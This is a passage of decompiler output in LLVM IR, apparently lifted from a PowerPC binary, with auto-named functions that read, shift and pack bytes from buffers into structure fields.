  %v4_10013a9c = zext i8 %v3_10013a9c to i32
  %v1_10013aa0 = call i32 @__asm_rlwinm(i32 %v4_10013a9c, i32 31, i32 31, i32 31)
  %v2_10013aa4 = add i32 %arg2, 16
  %v3_10013aa4 = inttoptr i32 %v2_10013aa4 to i32*
  store i32 %v1_10013aa0, i32* %v3_10013aa4, align 4
  %v0_10013aa8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013aa8 = add i32 %v0_10013aa8, 2
  %v2_10013aa8 = inttoptr i32 %v1_10013aa8 to i8*
  %v3_10013aa8 = load i8, i8* %v2_10013aa8, align 1
  %tmp1 = urem i8 %v3_10013aa8, 2
  %v1_10013aac = zext i8 %tmp1 to i32
  %v2_10013ab0 = add i32 %arg2, 20
  %v3_10013ab0 = inttoptr i32 %v2_10013ab0 to i32*
  store i32 %v1_10013aac, i32* %v3_10013ab0, align 4
  %v0_10013ab4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ab4 = add i32 %v0_10013ab4, 3
  %v2_10013ab4 = inttoptr i32 %v1_10013ab4 to i8*
  %v3_10013ab4 = load i8, i8* %v2_10013ab4, align 1
  %v4_10013ab4 = zext i8 %v3_10013ab4 to i32
  %v1_10013ab8 = call i32 @__asm_rlwinm(i32 %v4_10013ab4, i32 25, i32 31, i32 31)
  %v2_10013abc = add i32 %arg2, 24
  %v3_10013abc = inttoptr i32 %v2_10013abc to i32*
  store i32 %v1_10013ab8, i32* %v3_10013abc, align 4
  %v0_10013ac0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ac0 = add i32 %v0_10013ac0, 3
  %v2_10013ac0 = inttoptr i32 %v1_10013ac0 to i8*
  %v3_10013ac0 = load i8, i8* %v2_10013ac0, align 1
  %tmp2 = urem i8 %v3_10013ac0, 16
  %v1_10013ac4 = zext i8 %tmp2 to i32
  %v2_10013ac8 = add i32 %arg2, 28
  %v3_10013ac8 = inttoptr i32 %v2_10013ac8 to i32*
  store i32 %v1_10013ac4, i32* %v3_10013ac8, align 4
  %v0_10013acc = load i32, i32* %r9.global-to-local, align 4
  %v1_10013acc = add i32 %v0_10013acc, 4
  %v2_10013acc = inttoptr i32 %v1_10013acc to i8*
  %v3_10013acc = load i8, i8* %v2_10013acc, align 1
  %v4_10013acc = zext i8 %v3_10013acc to i32
  %v1_10013ad0 = add i32 %v0_10013acc, 5
  %v2_10013ad0 = inttoptr i32 %v1_10013ad0 to i8*
  %v3_10013ad0 = load i8, i8* %v2_10013ad0, align 1
  %v4_10013ad0 = zext i8 %v3_10013ad0 to i32
  %v1_10013ad4 = mul nuw nsw i32 %v4_10013acc, 256
  %v2_10013ad8 = or i32 %v4_10013ad0, %v1_10013ad4
  %v2_10013adc = add i32 %arg2, 32
  %v3_10013adc = inttoptr i32 %v2_10013adc to i32*
  store i32 %v2_10013ad8, i32* %v3_10013adc, align 4
  %v0_10013ae0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ae0 = add i32 %v0_10013ae0, 6
  %v2_10013ae0 = inttoptr i32 %v1_10013ae0 to i8*
  %v3_10013ae0 = load i8, i8* %v2_10013ae0, align 1
  %v4_10013ae0 = zext i8 %v3_10013ae0 to i32
  %v1_10013ae4 = add i32 %v0_10013ae0, 7
  %v2_10013ae4 = inttoptr i32 %v1_10013ae4 to i8*
  %v3_10013ae4 = load i8, i8* %v2_10013ae4, align 1
  %v4_10013ae4 = zext i8 %v3_10013ae4 to i32
  %v1_10013ae8 = mul nuw nsw i32 %v4_10013ae0, 256
  %v2_10013aec = or i32 %v4_10013ae4, %v1_10013ae8
  %v2_10013af0 = add i32 %arg2, 36
  %v3_10013af0 = inttoptr i32 %v2_10013af0 to i32*
  store i32 %v2_10013aec, i32* %v3_10013af0, align 4
  %v0_10013af4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013af4 = add i32 %v0_10013af4, 8
  %v2_10013af4 = inttoptr i32 %v1_10013af4 to i8*
  %v3_10013af4 = load i8, i8* %v2_10013af4, align 1
  %v4_10013af4 = zext i8 %v3_10013af4 to i32
  %v1_10013af8 = add i32 %v0_10013af4, 9
  %v2_10013af8 = inttoptr i32 %v1_10013af8 to i8*
  %v3_10013af8 = load i8, i8* %v2_10013af8, align 1
  %v4_10013af8 = zext i8 %v3_10013af8 to i32
  %v1_10013afc = mul nuw nsw i32 %v4_10013af4, 256
  %v2_10013b00 = or i32 %v4_10013af8, %v1_10013afc
  %v2_10013b04 = add i32 %arg2, 40
  %v3_10013b04 = inttoptr i32 %v2_10013b04 to i32*
  store i32 %v2_10013b00, i32* %v3_10013b04, align 4
  %v0_10013b08 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013b08 = add i32 %v0_10013b08, 10
  %v2_10013b08 = inttoptr i32 %v1_10013b08 to i8*
  %v3_10013b08 = load i8, i8* %v2_10013b08, align 1
  %v4_10013b08 = zext i8 %v3_10013b08 to i32
  %v1_10013b0c = add i32 %v0_10013b08, 11
  %v2_10013b0c = inttoptr i32 %v1_10013b0c to i8*
  %v3_10013b0c = load i8, i8* %v2_10013b0c, align 1
  %v4_10013b0c = zext i8 %v3_10013b0c to i32
  store i32 %v4_10013b0c, i32* %r9.global-to-local, align 4
  %v1_10013b10 = mul nuw nsw i32 %v4_10013b08, 256
  %v2_10013b14 = or i32 %v4_10013b0c, %v1_10013b10
  %v2_10013b18 = add i32 %arg2, 44
  %v3_10013b18 = inttoptr i32 %v2_10013b18 to i32*
  store i32 %v2_10013b14, i32* %v3_10013b18, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 7, 8, 9, 5, 6, 12, 10, 11, 0, 1, 2, 3, 4 }
  uselistorder i32 11, { 13, 14, 6, 15, 3, 7, 0, 1, 8, 9, 10, 11, 12, 2, 4, 5 }
  uselistorder i32 7, { 8, 9, 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 5, { 17, 18, 8, 9, 10, 1, 2, 11, 3, 12, 13, 0, 15, 16, 4, 5, 6, 7, 14 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 14, 3, 5, 6, 7, 8, 0, 4, 9, 1, 2, 10, 11, 12, 13 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @function_10013b20(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10013b20:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10013b3c = load i32, i32* %arg1, align 4
  store i32 %v2_10013b3c, i32* %r3.global-to-local, align 4
  store i32 268516164, i32* @lr, align 4
  %v1_10013b40 = inttoptr i32 %v2_10013b3c to i8*
  %v2_10013b40 = call i32 @function_100142b0(i8* %v1_10013b40)
  store i32 %v2_10013b40, i32* %r3.global-to-local, align 4
  %v1_10013b44 = icmp slt i32 %v2_10013b40, 0
  %v1_10013b48 = load i32, i32* @r29, align 4
  %v2_10013b48 = sub i32 %v1_10013b48, %v2_10013b40
  store i32 %v2_10013b48, i32* @r29, align 4
  br i1 %v1_10013b44, label %dec_label_pc_10013b88, label %dec_label_pc_10013b54

dec_label_pc_10013b54:                            ; preds = %dec_label_pc_10013b20
  %v2_10013b4c = icmp sgt i32 %v2_10013b48, 3
  %v0_10013b54 = load i32, i32* @r30, align 4
  %v2_10013b54 = add i32 %v0_10013b54, %v2_10013b40
  store i32 %v2_10013b54, i32* %r9.global-to-local, align 4
  br i1 %v2_10013b4c, label %dec_label_pc_10013b64, label %dec_label_pc_10013b5c

dec_label_pc_10013b5c:                            ; preds = %dec_label_pc_10013b54
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013b88

dec_label_pc_10013b64:                            ; preds = %dec_label_pc_10013b54
  %v0_10013b64 = load i32, i32* @r31, align 4
  %v1_10013b64 = add i32 %v0_10013b64, 6
  %v2_10013b64 = inttoptr i32 %v1_10013b64 to i8*
  %v3_10013b64 = load i8, i8* %v2_10013b64, align 1
  %v5_10013b68 = inttoptr i32 %v2_10013b54 to i8*
  store i8 %v3_10013b64, i8* %v5_10013b68, align 1
  %v0_10013b6c = load i32, i32* %r3.global-to-local, align 4
  %v1_10013b6c = add i32 %v0_10013b6c, 4
  store i32 %v1_10013b6c, i32* %r3.global-to-local, align 4
  %v0_10013b70 = load i32, i32* @r31, align 4
  %v1_10013b70 = add i32 %v0_10013b70, 4
  %v2_10013b70 = inttoptr i32 %v1_10013b70 to i32*
  %v3_10013b70 = load i32, i32* %v2_10013b70, align 4
  %v1_10013b74 = trunc i32 %v3_10013b70 to i8
  %v2_10013b74 = load i32, i32* %r9.global-to-local, align 4
  %v3_10013b74 = add i32 %v2_10013b74, 1
  %v4_10013b74 = inttoptr i32 %v3_10013b74 to i8*
  store i8 %v1_10013b74, i8* %v4_10013b74, align 1
  %v0_10013b78 = load i32, i32* @r31, align 4
  %v1_10013b78 = add i32 %v0_10013b78, 10
  %v2_10013b78 = inttoptr i32 %v1_10013b78 to i8*
  %v3_10013b78 = load i8, i8* %v2_10013b78, align 1
  %v2_10013b7c = load i32, i32* %r9.global-to-local, align 4
  %v3_10013b7c = add i32 %v2_10013b7c, 2
  %v4_10013b7c = inttoptr i32 %v3_10013b7c to i8*
  store i8 %v3_10013b78, i8* %v4_10013b7c, align 1
  %v0_10013b80 = load i32, i32* @r31, align 4
  %v1_10013b80 = add i32 %v0_10013b80, 8
  %v2_10013b80 = inttoptr i32 %v1_10013b80 to i32*
  %v3_10013b80 = load i32, i32* %v2_10013b80, align 4
  %v1_10013b84 = trunc i32 %v3_10013b80 to i8
  %v2_10013b84 = load i32, i32* %r9.global-to-local, align 4
  %v3_10013b84 = add i32 %v2_10013b84, 3
  %v4_10013b84 = inttoptr i32 %v3_10013b84 to i8*
  store i8 %v1_10013b84, i8* %v4_10013b84, align 1
  %v0_10013b98.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013b88

dec_label_pc_10013b88:                            ; preds = %dec_label_pc_10013b20, %dec_label_pc_10013b5c, %dec_label_pc_10013b64
  %v0_10013b98 = phi i32 [ %v2_10013b40, %dec_label_pc_10013b20 ], [ -1, %dec_label_pc_10013b5c ], [ %v0_10013b98.pre, %dec_label_pc_10013b64 ]
  ret i32 %v0_10013b98

; uselistorder directives
  uselistorder i32 %v2_10013b40, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder label %dec_label_pc_10013b88, { 2, 1, 0 }
}

define i32 @function_10013b9c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10013b9c:
  store i32 268516268, i32* @lr, align 4
  %v0_10013ba8 = call i32 @function_10014470()
  %v1_10013bac = icmp slt i32 %v0_10013ba8, 0
  br i1 %v1_10013bac, label %dec_label_pc_10013bb8, label %dec_label_pc_10013bb4

dec_label_pc_10013bb4:                            ; preds = %dec_label_pc_10013b9c
  %v1_10013bb4 = add i32 %v0_10013ba8, 4
  br label %dec_label_pc_10013bb8

dec_label_pc_10013bb8:                            ; preds = %dec_label_pc_10013b9c, %dec_label_pc_10013bb4
  %v0_10013bc4 = phi i32 [ %v0_10013ba8, %dec_label_pc_10013b9c ], [ %v1_10013bb4, %dec_label_pc_10013bb4 ]
  ret i32 %v0_10013bc4

; uselistorder directives
  uselistorder label %dec_label_pc_10013bb8, { 1, 0 }
}

define i32 @function_10013bc8(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_10013bc8:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_10013bcc = load i32, i32* @lr, align 4
  store i32 %v0_10013bcc, i32* %r0.global-to-local, align 4
  %v2_10013bd4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_10013bd4, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %v2_10013bd4, i32* %r5.global-to-local, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268516344, i32* @lr, align 4
  %v2_10013bf4 = call i32 @function_1001437c(i32 %v2_10013bd4, i32 256)
  store i32 %v2_10013bf4, i32* @r27, align 4
  %v1_10013bf8 = icmp slt i32 %v2_10013bf4, 0
  %v0_10013bfc = load i32, i32* @r28, align 4
  %v2_10013bfc = add i32 %v0_10013bfc, %v2_10013bf4
  store i32 %v2_10013bfc, i32* @r28, align 4
  %v1_10013c00 = load i32, i32* @r29, align 4
  %v2_10013c00 = sub i32 %v1_10013c00, %v2_10013bfc
  %v1_10013c04 = add i32 %v2_10013c00, -10
  br i1 %v1_10013bf8, label %dec_label_pc_10013cc0, label %dec_label_pc_10013c10

dec_label_pc_10013c10:                            ; preds = %dec_label_pc_10013bc8
  %v0_10013c14 = load i32, i32* @r26, align 4
  %v2_10013c14 = add i32 %v0_10013c14, %v2_10013bfc
  store i32 %v2_10013c14, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_10013c04, -1
  br i1 %tmp6, label %dec_label_pc_10013c24, label %dec_label_pc_10013c1c

dec_label_pc_10013c1c:                            ; preds = %dec_label_pc_10013c10
  store i32 %v1_10013c04, i32* @r27, align 4
  br label %dec_label_pc_10013cc0

dec_label_pc_10013c24:                            ; preds = %dec_label_pc_10013c10
  store i32 268516392, i32* @lr, align 4
  %v1_10013c24 = call i32 @function_10013230(i32 %v2_10013bd4)
  %v0_10013c28 = load i32, i32* @r30, align 4
  %v1_10013c28 = add i32 %v0_10013c28, 2
  store i32 %v1_10013c28, i32* %r8.global-to-local, align 4
  %v1_10013c2c = load i32, i32* @r31, align 4
  %v2_10013c2c = inttoptr i32 %v1_10013c2c to i32*
  store i32 %v1_10013c24, i32* %v2_10013c2c, align 4
  %v0_10013c30 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013c30 = add i32 %v0_10013c30, 2
  store i32 %v1_10013c30, i32* %r10.global-to-local, align 4
  %v0_10013c34 = load i32, i32* @r30, align 4
  %v1_10013c34 = add i32 %v0_10013c34, 10
  store i32 %v1_10013c34, i32* %r5.global-to-local, align 4
  %v0_10013c38 = load i32, i32* @r28, align 4
  %v1_10013c38 = add i32 %v0_10013c38, 10
  store i32 %v1_10013c38, i32* %r6.global-to-local, align 4
  %v0_10013c3c = load i32, i32* @r26, align 4
  %v2_10013c3c = add i32 %v0_10013c3c, %v0_10013c38
  %v3_10013c3c = inttoptr i32 %v2_10013c3c to i8*
  %v4_10013c3c = load i8, i8* %v3_10013c3c, align 1
  %v5_10013c3c = zext i8 %v4_10013c3c to i32
  store i32 %v5_10013c3c, i32* %r0.global-to-local, align 4
  %v1_10013c40 = add i32 %v0_10013c34, 1
  %v2_10013c40 = inttoptr i32 %v1_10013c40 to i8*
  %v3_10013c40 = load i8, i8* %v2_10013c40, align 1
  %v4_10013c40 = zext i8 %v3_10013c40 to i32
  store i32 %v4_10013c40, i32* %r9.global-to-local, align 4
  %v1_10013c44 = mul nuw nsw i32 %v5_10013c3c, 256
  %v2_10013c48 = or i32 %v4_10013c40, %v1_10013c44
  store i32 %v2_10013c48, i32* %r0.global-to-local, align 4
  %v1_10013c4c = load i32, i32* @r31, align 4
  %v2_10013c4c = add i32 %v1_10013c4c, 4
  %v3_10013c4c = inttoptr i32 %v2_10013c4c to i32*
  store i32 %v2_10013c48, i32* %v3_10013c4c, align 4
  %v0_10013c50 = load i32, i32* @r30, align 4
  %v1_10013c50 = add i32 %v0_10013c50, 2
  %v2_10013c50 = inttoptr i32 %v1_10013c50 to i8*
  %v3_10013c50 = load i8, i8* %v2_10013c50, align 1
  %v4_10013c50 = zext i8 %v3_10013c50 to i32
  store i32 %v4_10013c50, i32* %r0.global-to-local, align 4
  %v0_10013c54 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013c54 = add i32 %v0_10013c54, 1
  %v2_10013c54 = inttoptr i32 %v1_10013c54 to i8*
  %v3_10013c54 = load i8, i8* %v2_10013c54, align 1
  %v4_10013c54 = zext i8 %v3_10013c54 to i32
  store i32 %v4_10013c54, i32* %r9.global-to-local, align 4
  %v1_10013c58 = mul nuw nsw i32 %v4_10013c50, 256
  %v2_10013c5c = or i32 %v4_10013c54, %v1_10013c58
  store i32 %v2_10013c5c, i32* %r0.global-to-local, align 4
  %v1_10013c60 = load i32, i32* @r31, align 4
  %v2_10013c60 = add i32 %v1_10013c60, 8
  %v3_10013c60 = inttoptr i32 %v2_10013c60 to i32*
  store i32 %v2_10013c5c, i32* %v3_10013c60, align 4
  %v0_10013c64 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013c64 = add i32 %v0_10013c64, 2
  %v2_10013c64 = inttoptr i32 %v1_10013c64 to i8*
  %v3_10013c64 = load i8, i8* %v2_10013c64, align 1
  %v4_10013c64 = zext i8 %v3_10013c64 to i32
  store i32 %v4_10013c64, i32* %r0.global-to-local, align 4
  %v0_10013c68 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013c68 = add i32 %v0_10013c68, 1
  %v2_10013c68 = inttoptr i32 %v1_10013c68 to i8*
  %v3_10013c68 = load i8, i8* %v2_10013c68, align 1
  %v4_10013c68 = zext i8 %v3_10013c68 to i32
  %v1_10013c6c = add i32 %v0_10013c68, 3
  %v2_10013c6c = inttoptr i32 %v1_10013c6c to i8*
  %v3_10013c6c = load i8, i8* %v2_10013c6c, align 1
  %v4_10013c6c = zext i8 %v3_10013c6c to i32
  %v1_10013c70 = add i32 %v0_10013c68, 2
  %v2_10013c70 = inttoptr i32 %v1_10013c70 to i8*
  %v3_10013c70 = load i8, i8* %v2_10013c70, align 1
  %v4_10013c70 = zext i8 %v3_10013c70 to i32
  %v1_10013c74 = mul nuw i32 %v4_10013c64, 16777216
  %v1_10013c78 = mul nuw nsw i32 %v4_10013c68, 65536
  %v2_10013c7c = or i32 %v1_10013c78, %v1_10013c74
  %v2_10013c80 = or i32 %v2_10013c7c, %v4_10013c6c
  store i32 %v2_10013c80, i32* %r0.global-to-local, align 4
  %v1_10013c84 = mul nuw nsw i32 %v4_10013c70, 256
  %v2_10013c88 = or i32 %v1_10013c84, %v2_10013c80
  store i32 %v2_10013c88, i32* %r9.global-to-local, align 4
  %v1_10013c8c = load i32, i32* @r31, align 4
  %v2_10013c8c = add i32 %v1_10013c8c, 12
  %v3_10013c8c = inttoptr i32 %v2_10013c8c to i32*
  store i32 %v2_10013c88, i32* %v3_10013c8c, align 4
  %v0_10013c90 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013c90 = add i32 %v0_10013c90, 6
  %v2_10013c90 = inttoptr i32 %v1_10013c90 to i8*
  %v3_10013c90 = load i8, i8* %v2_10013c90, align 1
  %v4_10013c90 = zext i8 %v3_10013c90 to i32
  store i32 %v4_10013c90, i32* %r9.global-to-local, align 4
  %v0_10013c94 = load i32, i32* @r30, align 4
  %v1_10013c94 = add i32 %v0_10013c94, 9
  %v2_10013c94 = inttoptr i32 %v1_10013c94 to i8*
  %v3_10013c94 = load i8, i8* %v2_10013c94, align 1
  %v4_10013c94 = zext i8 %v3_10013c94 to i32
  store i32 %v4_10013c94, i32* %r0.global-to-local, align 4
  %v0_10013c98 = load i32, i32* %r6.global-to-local, align 4
  %v1_10013c98 = load i32, i32* @r31, align 4
  %v2_10013c98 = add i32 %v1_10013c98, 24
  %v3_10013c98 = inttoptr i32 %v2_10013c98 to i32*
  store i32 %v0_10013c98, i32* %v3_10013c98, align 4
  %v0_10013c9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10013c9c = mul i32 %v0_10013c9c, 256
  store i32 %v1_10013c9c, i32* %r9.global-to-local, align 4
  %v0_10013ca0 = load i32, i32* %r5.global-to-local, align 4
  %v1_10013ca0 = load i32, i32* @r31, align 4
  %v2_10013ca0 = add i32 %v1_10013ca0, 20
  %v3_10013ca0 = inttoptr i32 %v2_10013ca0 to i32*
  store i32 %v0_10013ca0, i32* %v3_10013ca0, align 4
  %v0_10013ca4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ca4 = load i32, i32* %r0.global-to-local, align 4
  %v2_10013ca4 = or i32 %v1_10013ca4, %v0_10013ca4
  store i32 %v2_10013ca4, i32* %r9.global-to-local, align 4
  %v0_10013ca8 = load i32, i32* @r29, align 4
  %v2_10013ca8 = icmp slt i32 %v0_10013ca8, %v2_10013ca4
  %v1_10013cac = add i32 %v2_10013ca4, 10
  store i32 %v1_10013cac, i32* %r0.global-to-local, align 4
  %v0_10013cb0 = load i32, i32* @r27, align 4
  %v2_10013cb0 = add i32 %v0_10013cb0, %v1_10013cac
  store i32 %v2_10013cb0, i32* @r27, align 4
  %v1_10013cb4 = load i32, i32* @r31, align 4
  %v2_10013cb4 = add i32 %v1_10013cb4, 16
  %v3_10013cb4 = inttoptr i32 %v2_10013cb4 to i32*
  store i32 %v2_10013ca4, i32* %v3_10013cb4, align 4
  br i1 %v2_10013ca8, label %dec_label_pc_10013cbc, label %dec_label_pc_10013c24.dec_label_pc_10013cc0_crit_edge

dec_label_pc_10013c24.dec_label_pc_10013cc0_crit_edge: ; preds = %dec_label_pc_10013c24
  %v0_10013cc4.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10013cc0

dec_label_pc_10013cbc:                            ; preds = %dec_label_pc_10013c24
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10013cc0

dec_label_pc_10013cc0:                            ; preds = %dec_label_pc_10013c24.dec_label_pc_10013cc0_crit_edge, %dec_label_pc_10013bc8, %dec_label_pc_10013c1c, %dec_label_pc_10013cbc
  %v0_10013cc4 = phi i32 [ %v0_10013cc4.pre, %dec_label_pc_10013c24.dec_label_pc_10013cc0_crit_edge ], [ %v2_10013bf4, %dec_label_pc_10013bc8 ], [ %v1_10013c04, %dec_label_pc_10013c1c ], [ -1, %dec_label_pc_10013cbc ]
  store i32 %v0_10013bcc, i32* %r0.global-to-local, align 4
  ret i32 %v0_10013cc4

; uselistorder directives
  uselistorder i32 %v2_10013ca4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10013c04, { 1, 2, 0 }
  uselistorder i32 %v2_10013bf4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10013bd4, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 65536, { 0, 27, 1, 29, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 14, 28, 15, 18, 17, 16, 20, 21, 19, 22, 24, 25, 23, 26 }
  uselistorder i32 3, { 48, 49, 50, 51, 52, 53, 54, 18, 55, 2, 56, 41, 3, 0, 9, 19, 21, 20, 11, 22, 57, 10, 62, 4, 63, 64, 42, 43, 23, 44, 47, 24, 25, 26, 27, 28, 35, 60, 61, 36, 66, 38, 15, 5, 6, 65, 58, 59, 7, 71, 72, 73, 67, 68, 69, 70, 13, 46, 45, 8, 14, 37, 16, 29, 1, 30, 39, 40, 31, 32, 33, 34, 17, 12 }
  uselistorder i32 (i32)* @function_10013230, { 2, 1, 0 }
  uselistorder i32 -10, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 256, { 0, 1, 2, 3, 46, 51, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 52, 16, 44, 17, 18, 19, 20, 21, 22, 23, 24, 48, 25, 49, 50, 54, 26, 27, 28, 29, 30, 53, 47, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 45, 41, 42, 43 }
  uselistorder label %dec_label_pc_10013cc0, { 3, 0, 2, 1 }
}

define i32 @function_10013cd8() local_unnamed_addr {
dec_label_pc_10013cd8:
  %v0_10013cdc = load i32, i32* @lr, align 4
  store i32 268516608, i32* @lr, align 4
  %v3_10013cfc = call i32 @function_100126e8(i32 ptrtoint ([11 x i8]* @global_var_1001a570.854 to i32), i32 ptrtoint (i32* @global_var_1001a50c.816 to i32))
  %v3_10013d04 = icmp eq i32 %v3_10013cfc, 0
  br i1 %v3_10013d04, label %dec_label_pc_10013d0c, label %dec_label_pc_10013d28

dec_label_pc_10013d0c:                            ; preds = %dec_label_pc_10013cd8
  %v0_10013d00 = load i32, i32* @r29, align 4
  store i32 %v0_10013cdc, i32* @lr, align 4
  %v3_10013d24 = call i32 @function_100126e8(i32 ptrtoint ([18 x i8]* @global_var_1001a57c.855 to i32), i32 %v0_10013d00)
  br label %dec_label_pc_10013d28

dec_label_pc_10013d28:                            ; preds = %dec_label_pc_10013cd8, %dec_label_pc_10013d0c
  %v0_10013d38 = phi i32 [ %v3_10013cfc, %dec_label_pc_10013cd8 ], [ %v3_10013d24, %dec_label_pc_10013d0c ]
  ret i32 %v0_10013d38

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_100126e8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10013d28, { 1, 0 }
}

define i32 @function_10013d3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_10013d3c:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_10013d40 = load i32, i32* @lr, align 4
  %v1_10013d48 = sub i32 0, %arg6
  %v1_10013d4c = urem i32 %v1_10013d48, 4
  store i32 %v1_10013d4c, i32* %r0.global-to-local, align 4
  %v3_10013d4c = icmp eq i32 %v1_10013d4c, 0
  store i32 %arg6, i32* @r30, align 4
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_10013d6c = load i32, i32* @r10, align 4
  store i32 %v0_10013d6c, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_10013d88.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_10013d4c, label %dec_label_pc_10013d88, label %dec_label_pc_10013d78

dec_label_pc_10013d78:                            ; preds = %dec_label_pc_10013d3c
  %v2_10013d78 = icmp ult i32 %v0_10013d88.pr, %v1_10013d4c
  br i1 %v2_10013d78, label %dec_label_pc_1001403c, label %dec_label_pc_10013d80

dec_label_pc_10013d80:                            ; preds = %dec_label_pc_10013d78
  %v2_10013d80 = sub i32 %v0_10013d88.pr, %v1_10013d4c
  store i32 %v2_10013d80, i32* %r9.global-to-local, align 4
  %v2_10013d84 = add i32 %v1_10013d4c, %arg6
  store i32 %v2_10013d84, i32* @r30, align 4
  br label %dec_label_pc_10013d88

dec_label_pc_10013d88:                            ; preds = %dec_label_pc_10013d3c, %dec_label_pc_10013d80
  %v0_10013d94 = phi i32 [ %v2_10013d84, %dec_label_pc_10013d80 ], [ %arg6, %dec_label_pc_10013d3c ]
  %v0_10013d98 = phi i32 [ %v2_10013d80, %dec_label_pc_10013d80 ], [ %v0_10013d88.pr, %dec_label_pc_10013d3c ]
  %tmp49 = icmp ult i32 %v0_10013d98, 32
  br i1 %tmp49, label %dec_label_pc_1001403c, label %dec_label_pc_10013d90

dec_label_pc_10013d90:                            ; preds = %dec_label_pc_10013d88
  %v3_10013d90 = icmp eq i32 %arg4, 1
  %v1_10013d94 = add i32 %v0_10013d94, 32
  store i32 %v1_10013d94, i32* @r24, align 4
  %v1_10013d98 = add i32 %v0_10013d98, -32
  store i32 %v1_10013d98, i32* @r27, align 4
  br i1 %v3_10013d90, label %dec_label_pc_10013e98, label %dec_label_pc_10013da0

dec_label_pc_10013da0:                            ; preds = %dec_label_pc_10013d90
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10013da8 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_10013da8, align 4
  %tmp50 = icmp ult i32 %v1_10013d98, 4
  br i1 %tmp50, label %dec_label_pc_1001403c, label %dec_label_pc_10013db0

dec_label_pc_10013db0:                            ; preds = %dec_label_pc_10013da0
  %v0_10013db0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013db0 = add i32 %v0_10013db0, -36
  store i32 %v1_10013db0, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_10013db0, 8
  br i1 %tmp51, label %dec_label_pc_1001403c, label %dec_label_pc_10013dbc

dec_label_pc_10013dbc:                            ; preds = %dec_label_pc_10013db0
  %v0_10013dbc = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_10013dbc, 16
  br i1 %tmp52, label %dec_label_pc_1001403c, label %dec_label_pc_10013dc4

dec_label_pc_10013dc4:                            ; preds = %dec_label_pc_10013dbc
